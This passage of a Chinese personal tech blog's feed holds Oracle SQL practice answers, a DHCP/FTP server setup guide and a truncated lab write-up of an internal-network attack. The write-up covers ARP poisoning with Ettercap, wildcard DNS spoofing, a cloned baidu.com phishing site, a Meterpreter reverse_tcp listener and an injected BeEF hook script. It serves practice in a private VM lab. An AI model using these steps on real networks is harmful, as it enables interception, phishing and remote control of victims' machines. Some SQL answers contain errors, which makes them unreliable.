src="https://img-blog.csdnimg.cn/f06efc23062c4a1e92733b703c6c0323.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="read文件"><br>复制下来，base64解码解决</p><p><img src="https://img-blog.csdnimg.cn/ea733c0b23a148408304023ec9f32f59.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="base64解码"></p><hr />假期也不能随意放松啊....]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle数据库练习2</title>
    <link href="/2021/09/24/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%83%E4%B9%A02/"/>
    <url>/2021/09/24/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%83%E4%B9%A02/</url>
    
    <content type="html"><![CDATA[<p>﻿<strong>Oracle数据库练习2：</strong></p><p><font color=#999AAA >主要是emp、dept这两张表<br>emp表：<br><img src="https://img-blog.csdnimg.cn/0e8f3c2ef9fc4ec8810e102d66055834.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="emp表"><br>dept表：<br><img src="https://img-blog.csdnimg.cn/ee51a99515614046b3a41a944d3071b8.png#pic_center" alt="dept表"></p><hr /><p>1、列出至少有一个员工的所有部门<br>多表查询，按部门编号（deptno）分组，再对每个组里人员编号（empno）进行大于等于1的过滤筛选</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> d.deptno,<span class="hljs-built_in">COUNT</span>(e.empno)<br><span class="hljs-keyword">FROM</span> emp e,dept d<br><span class="hljs-keyword">WHERE</span> e.deptno <span class="hljs-operator">=</span> d.deptno(<span class="hljs-operator">+</span>)<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">COUNT</span>(e.ename) <span class="hljs-operator">&gt;=</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">by</span> d.deptno;<br></code></pre></td></tr></table></figure><hr /><p>2、列出薪金比“SMITH”多的所有员工。：<br>构造SMITH的sal值去比较</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> empno,ename,job,sal<br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> sal<span class="hljs-operator">&gt;</span>(<br><span class="hljs-keyword">SELECT</span> sal<br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> ename<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SMITH&#x27;</span><br>);<br></code></pre></td></tr></table></figure><hr /><p>3、列出所有员工的姓名及其直接上级的姓名。<br>多表查询，对上级编号（mgr）和个人编号（empno）进行匹配</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,s.ename <span class="hljs-keyword">as</span> lead<br><span class="hljs-keyword">FROM</span> emp e,emp s<br><span class="hljs-keyword">WHERE</span> e.mgr <span class="hljs-operator">=</span> s.empno(<span class="hljs-operator">+</span>);<br></code></pre></td></tr></table></figure><hr />4、列出受雇日期早于其直接上级的所有员工。<p>上一题的基础上，同时对入职日期进行判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename<br><span class="hljs-keyword">FROM</span> emp e,emp s<br><span class="hljs-keyword">WHERE</span> (e.mgr <span class="hljs-operator">=</span> s.empno) <span class="hljs-keyword">AND</span> (e.hiredate <span class="hljs-operator">&lt;</span> s.hiredate);<br></code></pre></td></tr></table></figure><hr />5、列出部门名称和这些部门的员工信息，同时列出那些没有员工的部门。<p>多表查询</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> d.dname,e.ename,e.job,e.sal,e.hiredate<br><span class="hljs-keyword">FROM</span> dept d,emp e<br><span class="hljs-keyword">WHERE</span> d.deptno <span class="hljs-operator">=</span> e.deptno(<span class="hljs-operator">+</span>);<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> d.dname,e.<span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> dept d,emp e<br><span class="hljs-keyword">WHERE</span> d.deptno <span class="hljs-operator">=</span> e.deptno(<span class="hljs-operator">+</span>);<br></code></pre></td></tr></table></figure><hr />6、列出所有“CLERK”（办事员）的姓名及其部门名称。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.job,d.dname<br><span class="hljs-keyword">FROM</span> emp e,dept d<br><span class="hljs-keyword">WHERE</span> (e.job <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;CLERK&#x27;</span>) <span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno);<br></code></pre></td></tr></table></figure><hr />7、列出最低薪金大于1500的各种工作。<p>按工作分组，过滤筛选最低薪金大于1500的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> job,<span class="hljs-built_in">MIN</span>(sal)<br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">GROUP</span> <span class="hljs-keyword">by</span> job<br><span class="hljs-keyword">HAVING</span> <span class="hljs-built_in">MIN</span>(sal) <span class="hljs-operator">&gt;</span> <span class="hljs-number">1500</span>;<br></code></pre></td></tr></table></figure><hr />8、列出在部门“SALES”（销售部）工作的员工的姓名，假定不知道销售部的部门编号。<p>多表查询，用部门编号（deptno）匹配两表，同时判定部门是’SALES’（销售部）</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.deptno,d.dname<br><span class="hljs-keyword">FROM</span> emp e,dept d<br><span class="hljs-keyword">WHERE</span> (d.dname <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SALES&#x27;</span>) <span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno);<br></code></pre></td></tr></table></figure><p>或者 </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> deptno <span class="hljs-operator">=</span> <br>(<span class="hljs-keyword">SELECT</span> deptno <span class="hljs-keyword">FROM</span> dept <span class="hljs-keyword">WHERE</span> dname <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;SALES&#x27;</span>);<br></code></pre></td></tr></table></figure><hr />9、列出薪金高于公司平均薪金的所有员工。<p>构造公司平均薪金去比较</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span><br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> sal <span class="hljs-operator">&gt;</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-built_in">AVG</span>(sal) <span class="hljs-keyword">FROM</span> emp);<br></code></pre></td></tr></table></figure><hr />]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Oracle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Oracle数据库练习1</title>
    <link href="/2021/09/23/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%83%E4%B9%A01/"/>
    <url>/2021/09/23/Oracle%E6%95%B0%E6%8D%AE%E5%BA%93%E7%BB%83%E4%B9%A01/</url>
    
    <content type="html"><![CDATA[<p>﻿<strong>Oracle数据库练习1：</strong></p><p><font color=#999AAA >最近开始学Oracle数据库，那自然就少不了训练，所有自己就从网上找了点题做</p><hr /><p>1.请从表EMP中查找工种是职员CLERK或经理MANAGER的雇员姓名、工资,<br>按工资由低到高向下排序。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ename,sal<br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> (job <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;CLERK&#x27;</span>) <span class="hljs-keyword">OR</span> (job <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;MANAGER&#x27;</span>)<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> SAL;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e5796c41f88c48b386591d322a0b01be.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_13,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="第一题"></p><hr /><p>2.请在EMP表中查找部门号在10－30之间的雇员的姓名、部门号、工资、工作，<br>按部门号由低到高向下排序，如果一样，按工资由低到高向下排序。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ename,deptno,sal,job<br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> deptno <span class="hljs-keyword">BETWEEN</span> <span class="hljs-number">10</span> <span class="hljs-keyword">AND</span> <span class="hljs-number">20</span><br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> deptno,sal;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f2c82fab90224116bd9968d5c1cf9bd6.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_18,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="第二题"></p><hr />3.请从表EMP中查找姓名以J开头所有雇员的姓名、工资、职位，按工资由低到高向下排序。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ename,sal,job<br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> ename <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;J%&#x27;</span><br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sal;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/cea0852a7ed6498b8e1589d728fb7acc.png#pic_center" alt="第三题"></p><hr />4.请从表EMP中查找工资低于2000的雇员的姓名、工作、工资，并按工资降序排列。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> ename,job,sal<br><span class="hljs-keyword">FROM</span> emp<br><span class="hljs-keyword">WHERE</span> sal <span class="hljs-operator">&lt;</span> <span class="hljs-number">2000</span><br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> sal <span class="hljs-keyword">desc</span>;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/dd4772c04a7544aba006eb050aac9793.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_16,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="第四题"></p><hr />5.请从表中查询工作是CLERK的所有人的姓名、工资、部门号、部门名称以及部门地址的信息。<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> e.ename,e.sal,e.deptno,d.dname,d.loc<br><span class="hljs-keyword">FROM</span> emp e,dept d<br><span class="hljs-keyword">WHERE</span> (job <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;CLERK&#x27;</span>) <span class="hljs-keyword">AND</span> (e.deptno <span class="hljs-operator">=</span> d.deptno)<br><span class="hljs-keyword">ORDER</span> <span class="hljs-keyword">BY</span> deptno,sal;<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/5df95c0c297549e0a531faebf650bc49.png#pic_center" alt="第五题"></p><hr />]]></content>
    
    
    <categories>
      
      <category>数据库</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Oracle</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DHCP和FTP服务器的配置与管理</title>
    <link href="/2021/09/21/DHCP%E3%80%81FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/"/>
    <url>/2021/09/21/DHCP%E3%80%81FTP%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%90%AD%E5%BB%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="DHCP和FTP服务器的配置与管理"><a href="#DHCP和FTP服务器的配置与管理" class="headerlink" title="DHCP和FTP服务器的配置与管理"></a>DHCP和FTP服务器的配置与管理</h1><hr /><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p></font><hr /><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><font color=#999AAA >两台虚拟机，1台Windows 2008，1台Windows 7，网卡均设置成VMnet1</font></p><hr /><h1 id="一、DHCP服务器搭建"><a href="#一、DHCP服务器搭建" class="headerlink" title="一、DHCP服务器搭建"></a>一、DHCP服务器搭建</h1><p>打开服务器管理器，在角色中创建新角色，选择dhcp服务器<br><img src="https://img-blog.csdnimg.cn/92b065dc6a004462b0ce3e449979a924.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="dhcp服务"><br>Ipv4父域随便来，这里是（qiyeserver.com）<br>首选NDS服务器ipv4地址为：192.168.31.21（要与本地ipv4地址同一网段，但不要一样，会有ip冲突）</p><p>Ipv4 wins设置为无</p><p>dhcp作用域:192.168.31.100-192.168.31.200<br>默认网关为：192.168.31.2<br>最后配置如下：<br><img src="https://img-blog.csdnimg.cn/8656f885c5f64642aabac3a8148e1f04.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="dhcp配置"><br>安装就行<br><img src="https://img-blog.csdnimg.cn/b506aefcb10048dd87fd264214c936a0.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="作用域"><br>打开win7，更新ip配置，重新连接网络</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ipconfig /release       //清空ip配置<br>ipconfig /renew         //重新获取IP配置<br></code></pre></td></tr></table></figure><p>查看ip，命令：ipconfig<br><img src="https://img-blog.csdnimg.cn/09489f63ade249a8859fd98b12e0f9b8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="win7本地网络配置查询"><br>可以发现，ip地址为dhcp池地址，网关也定向过来了，dns后缀也为qiyeserver.com</p><h1 id="二、FTP服务器搭建"><a href="#二、FTP服务器搭建" class="headerlink" title="二、FTP服务器搭建"></a>二、FTP服务器搭建</h1><p>先关防火墙<br>打开服务管理器，点击添加角色<br><img src="https://img-blog.csdnimg.cn/62e7ab19f6b64ff9af619e149a83f121.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="服务管理器"><br>选择web服务器（IIS），然后下一步<br><img src="https://img-blog.csdnimg.cn/4ffdbb3051914fe1983b47190eaed176.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="服务器角色"><br>web服务器（IIS），继续下一步<br>角色服务中勾选FTP服务器</p><p><img src="https://img-blog.csdnimg.cn/2ceb95e4c6554bcc9a19b21cf5206551.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="服务角色"><br>下一步，然后确认安装就行<br>然后再web服务器（IIS）下的Internet信息服务器右键添加FTP站点<br><img src="https://img-blog.csdnimg.cn/57dc8be00008425e933bf0be915983f3.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="添加ftp站点"><br><img src="https://img-blog.csdnimg.cn/ac9106bdb5ed4749b20b9c598b90abfb.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="绑定和ssl设置"><br>指定可登录的用户（就安全来讲，最好不要用administrator用户或是管理员组的用户）<br><img src="https://img-blog.csdnimg.cn/f4503c872fa24b83906f6acdb31b059e.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="身份认证"><br>完成<br>用同一网段的一台win7测试ftp服务<br><a href="ftp://ftp服务器ip/">ftp://ftp服务器ip</a><br><img src="https://img-blog.csdnimg.cn/705efea5bea840afa6801c033ba0e2b1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="登录ftp"><br>能够登录访问就行<br><img src="https://img-blog.csdnimg.cn/76e485d653f14e688d7ca6109d7598e9.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p><font color=#999AAA >学校任务，唉，尽让搞些有的没的</p>]]></content>
    
    
    <categories>
      
      <category>服务器</category>
      
    </categories>
    
    
    <tags>
      
      <tag>DHCP</tag>
      
      <tag>FTP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>内网渗透(arp欺骗 + DNS欺骗 + 网站钓鱼)</title>
    <link href="/2021/09/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(arp%E6%AC%BA%E9%AA%97%20+%20DNS%E6%AC%BA%E9%AA%97%20+%20%E7%BD%91%E7%AB%99%E9%92%93%E9%B1%BC)/"/>
    <url>/2021/09/18/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(arp%E6%AC%BA%E9%AA%97%20+%20DNS%E6%AC%BA%E9%AA%97%20+%20%E7%BD%91%E7%AB%99%E9%92%93%E9%B1%BC)/</url>
    
    <content type="html"><![CDATA[<h1 id="内网渗透-arp欺骗-DNS欺骗-网站钓鱼"><a href="#内网渗透-arp欺骗-DNS欺骗-网站钓鱼" class="headerlink" title="内网渗透(arp欺骗 + DNS欺骗 + 网站钓鱼)"></a>内网渗透(arp欺骗 + DNS欺骗 + 网站钓鱼)</h1><hr /><p>@<a href="%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95">TOC</a></p><hr /><h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><font color=#999AAA >攻击机kali：192.168.241.140<br>目标机win7：192.168.241.136<br>网关：192.168.241.2<br></font></p><hr /><h1 id="一、ARP数据流截取"><a href="#一、ARP数据流截取" class="headerlink" title="一、ARP数据流截取"></a>一、ARP数据流截取</h1><p>1、打开Ettercap GUI界面<br><img src="https://img-blog.csdnimg.cn/cbe703f2913a41e78e7bd454a6099f88.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_15,color_FFFFFF,t_70,g_se,x_16" alt="Ettercap"><br>以上述状态，点击右上角勾勾<br><img src="https://img-blog.csdnimg.cn/f52ea82c37564972b16ef9fe8ba11529.png" alt="Ettercap"><br>先左上角寻找网段内存活主机，并且把网关ip增加到target1，把目标机ip增加到target2上，然后选择右上星球图标，点击ARP poisoning，勾选sniff remote connections然后OK，开始攻击。</p><p>2.攻击</p><p>打开win7的cmd，查询arp地址表，发现攻击机物理地址与网关物理地址相同<br><img src="https://img-blog.csdnimg.cn/40c9301a0a8b408697fd46c5af39b301.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_19,color_FFFFFF,t_70,g_se,x_16" alt="win7 arp"><br>说明arp欺骗成功<br>回到kali，执行driftnet -i eth0命令抓取截图<br>结果还算成功<br><img src="https://img-blog.csdnimg.cn/15300fdfd5174f90afe87ab408583405.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="win7"></p><p><img src="https://img-blog.csdnimg.cn/34fa0b0e9def4ce9bfadb3aca80281c8.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="kali linux"></p><h1 id="二、DNS欺骗"><a href="#二、DNS欺骗" class="headerlink" title="二、DNS欺骗"></a>二、DNS欺骗</h1><p>首先修改Ettercap的dns配置文件</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">vim /etc/ettercap/etter.dns<br></code></pre></td></tr></table></figure><p>在19行增加一下内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">*.*.com   A   <span class="hljs-number">192.168</span>.<span class="hljs-number">241.140</span>  （自己的主机ip地址）<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/72a660714e6c44dfbbe7d42d187789c4.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="etter.dns"><br>当目标机想要访问外网地址时，必先经过网关，于是只要在网关伪造dns地址就能欺骗其目标机，给Ettercap增加插件，如图依次plugins、manage plugins、dns_spoof(前面有个*号就是在使用中了)<br><img src="https://img-blog.csdnimg.cn/5858e616470947ed8a92de616a9d4888.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>用目标机win7对百度进行ping通信，可以发现回显的是攻击机ip（百度ip应为163.177.151.109）<br><img src="https://img-blog.csdnimg.cn/984c5eebf60f44af928b82c62c252049.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p><h1 id="三、网站钓鱼"><a href="#三、网站钓鱼" class="headerlink" title="三、网站钓鱼"></a>三、网站钓鱼</h1><p>实验准备：beef、社会工程学工具包、msf、木马制作<br>安装apache: apt-get install apache<br>木马制作（并且存到网站根目录下）：<br><img src="https://img-blog.csdnimg.cn/381f37aeabbc41a2a82113f7087a3857.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>一、创建一个钓鱼网站<br>运用社会工程学工具包克隆一个被大众接受的网站，比如baidu.com<br>命令如下：<br>setoolkit<br>1)(社会工程学攻击)<br>  2)(web站点攻击模式)<br>    7)(HTA攻击方法)<br>       2)(网站克隆)<br>跟着数字选就行，直至这个页面：<br><img src="https://img-blog.csdnimg.cn/5b56f7657f8f4bf58f4c97b0606972c3.png#pic_center" alt="在这里插入图片描述"><br>输入要克隆的网站，这里选择输入baidu.com<br>然后就能关了这工具（其实接下来只靠社会工程学包是可以制定攻击的，但我试了好多次都不会返回shell，之后我再试试）<br>只要访问自己的ip，能够显示克隆地百度页面，就算成功了<br>二、筹划攻击<br>msf：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">msf6 &gt; use exploit/multi/handler<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LHOST <span class="hljs-number">192.168</span>.<span class="hljs-number">241.140</span><br>msf6 exploit(multi/handler) &gt; <span class="hljs-built_in">set</span> LPORT <span class="hljs-number">4444</span><br>exploit(multi/handler) &gt; exploit<br></code></pre></td></tr></table></figure><p>暂时放他监听就行…<br>beef:</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> /usr/share/beef<span class="hljs-literal">-xss</span><br>./beef<br></code></pre></td></tr></table></figure><p>最新版不能用默认账号密码登录，所以要在配置里改账号和密码,在/etc/beef-xss/config.yaml<br>成功运行后：<br><img src="https://img-blog.csdnimg.cn/6c592072f45f49ae857b4dafe811a387.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>把图中 <a href="http://192.168.241.140:3000/hook.js%E5%A4%8D%E5%88%B6%E5%88%B0/var/www/html/index.html%E4%B8%AD">http://192.168.241.140:3000/hook.js复制到/var/www/html/index.html中</a><br>写法如下（最后一行）：<br><img src="https://img-blog.csdnimg.cn/2091e1083e514660baf43745bc39ef5a.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5Ly96JOd5LmL5aCC,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"><br>在这之后，我们用浏览器打开  <a href="http://192.168.241.140:3000/ui/panel">http://192.168.241.140:3000/ui/panel</a><br>登录beef，由于之前的dns欺骗，目标一旦访问带.com结尾的网站，就会重定向到我们的钓鱼网站，这里假设目标访问了<a href="http://www.baidu.com，那么beef就会回应我们：">www.baidu.com，那么beef就会回应我们：</a><br><img 